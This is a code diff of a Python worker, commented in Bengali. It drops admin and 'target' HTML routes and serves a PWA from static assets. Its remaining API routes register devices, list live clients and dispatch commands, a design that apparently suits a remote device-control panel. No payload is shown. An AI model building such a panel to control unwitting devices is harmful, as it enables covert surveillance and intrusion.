@@ -1,5 +1,4 @@
 from workers import WorkerEntrypoint, Response
-from pathlib import Path
 from urllib.parse import urlparse
 import json
 import time
@@ -18,14 +17,7 @@ class Default(WorkerEntrypoint):
             "Access-Control-Allow-Headers": "Content-Type",
         }
 
-        if path in ("", "/") and request.method == "GET":
-            admin_file = Path(__file__).parent / "templates" / "admin.html"
-            return Response(admin_file.read_text(encoding="utf-8"), headers={"Content-Type": "text/html; charset=utf-8"})
-
-        if path == "/target" and request.method == "GET":
-            target_file = Path(__file__).parent / "templates" / "target.html"
-            return Response(target_file.read_text(encoding="utf-8"), headers={"Content-Type": "text/html; charset=utf-8"})
-
+        # ১. API রুট (ডেটা আপডেট)
         if path == "/api/update" and request.method == "POST":
             try:
                 data = await request.json()
@@ -61,6 +53,7 @@ class Default(WorkerEntrypoint):
             except Exception as e:
                 return Response(json.dumps({"error": str(e)}), status=400, headers={**cors_headers, "Content-Type": "application/json"})
 
+        # ২. API রুট (ডিভাইস লিস্ট)
         if path == "/api/clients" and request.method == "GET":
             now = time.time()
             # ১৫ সেকেন্ডের বেশি পুরনো ডিভাইস রিমুভ করা
@@ -68,6 +61,7 @@ class Default(WorkerEntrypoint):
             clients = active_clients
             return Response(json.dumps(clients), headers={**cors_headers, "Content-Type": "application/json"})
 
+        # ৩. API রুট (কমান্ড পাঠানো)
         if path == "/api/command" and request.method == "POST":
             try:
                 data = await request.json()
@@ -83,4 +77,5 @@ class Default(WorkerEntrypoint):
         if request.method == "OPTIONS":
             return Response("", headers=cors_headers)
 
-        return Response("Not found", status=404)
+        # ৪. PWA এবং HTML স্ট্যাটিক ফাইল (ASSETS বাইন্ডিং থেকে)
+        return await self.env.ASSETS.fetch(request)
